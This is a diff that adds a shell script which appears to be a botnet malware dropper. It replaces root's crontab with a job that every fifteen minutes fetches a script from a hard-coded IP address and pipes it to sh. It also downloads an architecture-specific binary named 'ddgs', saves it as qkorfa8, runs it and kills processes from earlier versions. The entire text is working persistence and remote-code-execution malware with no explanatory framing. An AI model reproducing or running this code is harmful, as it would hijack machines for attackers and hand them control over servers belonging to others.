@@ -1,0 +1,33 @@
+export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
+
+mkdir -p /var/spool/cron/crontabs
+echo "" > /var/spool/cron/root
+echo "*/15 * * * * (/usr/bin/qkorfa8||/usr/libexec/qkorfa8||/usr/local/bin/qkorfa8||/tmp/qkorfa8||curl -fsSL -m180 http://157.245.59.230:8000/i.sh||wget -q -T180 -O- http://157.245.59.230:8000/i.sh) | sh" >> /var/spool/cron/root
+cp -f /var/spool/cron/root /var/spool/cron/crontabs/root
+
+cd /tmp
+touch /usr/local/bin/writeable && cd /usr/local/bin/
+touch /usr/libexec/writeable && cd /usr/libexec/
+touch /usr/bin/writeable && cd /usr/bin/
+rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable
+
+export PATH=$PATH:$(pwd)
+ps auxf | grep -v grep | grep qkorfa8 || rm -rf qkorfa8
+if [ ! -f "qkorfa8" ]; then
+    curl -fsSL -m1800 http://157.245.59.230:8000/static/4008/ddgs.$(uname -m) -o qkorfa8||wget -q -T1800 http://157.245.59.230:8000/static/4008/ddgs.$(uname -m) -O qkorfa8
+fi
+chmod +x qkorfa8
+/usr/bin/qkorfa8||/usr/libexec/qkorfa8||/usr/local/bin/qkorfa8||/tmp/qkorfa8
+
+ps auxf | grep -v grep | grep qkorbcb | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep qkorbcc | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep qkorbcd | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep qkorbce | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep qkorfa0 | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep qkorfa1 | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep qkorfa2 | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep qkorfa3 | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep qkorfa4 | awk '{print $2}' | xargs kill -9
+
+echo "*/15 * * * * (/usr/bin/qkorfa8||/usr/libexec/qkorfa8||/usr/local/bin/qkorfa8||/tmp/qkorfa8||curl -m180 -fsSL http://157.245.59.230:8000/i.sh||wget -q -T180 -O- http://157.245.59.230:8000/i.sh) | sh" | crontab -
+
